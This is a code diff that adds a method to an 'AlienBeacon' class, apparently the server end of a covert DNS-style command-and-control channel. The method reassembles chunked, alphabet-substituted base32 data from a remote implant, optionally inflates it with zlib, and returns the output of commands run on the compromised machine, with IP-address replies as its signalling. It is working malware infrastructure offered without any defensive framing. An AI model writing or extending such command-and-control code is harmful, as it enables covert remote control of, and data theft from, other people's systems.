@@ -173,3 +173,43 @@ class AlienBeacon:
 
         ip_address = "123.111.222.12"
         return BeaconResponse(ip_address, None)
+
+    def process_continued_commandresult_request(self, data):
+        self.log("Request: SEND (continued)", loglevel=logging.DEBUG)
+        length_of_my_counter = len(encode_int_into_str(self.counter, self.alphabet))
+
+        chunk = data[3:]
+
+        chunk = chunk[:-length_of_my_counter]
+
+        translation_table = chunk.maketrans(self.alphabet, CHARACTER_SET)
+        chunk = chunk.translate(translation_table)
+
+        decoded_chunk = bruteforce_base32(chunk)
+        self.result += decoded_chunk
+
+        self.update_counter()
+
+        progress = round((len(self.result) / self.buffer_size) * 100, 2)
+        self.log(f"Command result chunk received ({progress}%): {decoded_chunk}", loglevel=logging.DEBUG)
+
+        ip_address = "123.111.222.13"
+        if len(self.result) >= self.buffer_size:
+            first_byte = self.result[0]
+            command_output = self.result[1:]
+
+            if first_byte == CODE_FOR_ZLIB_DEFLATED_OUTPUT:
+                decompress = zlib.decompressobj(-zlib.MAX_WBITS)
+                command_output = decompress.decompress(command_output)
+                command_output += decompress.flush()
+
+            self.command = ""
+            self.command_sent = ""
+            self.buffer_size = 0
+            self.result = b""
+            self.state = BeaconStates.firstalive_done
+
+            response = BeaconResult(ResultCodes.COMMAND_OUTPUT, command_output)
+            return BeaconResponse(ip_address, response)
+
+        return BeaconResponse(ip_address, None)
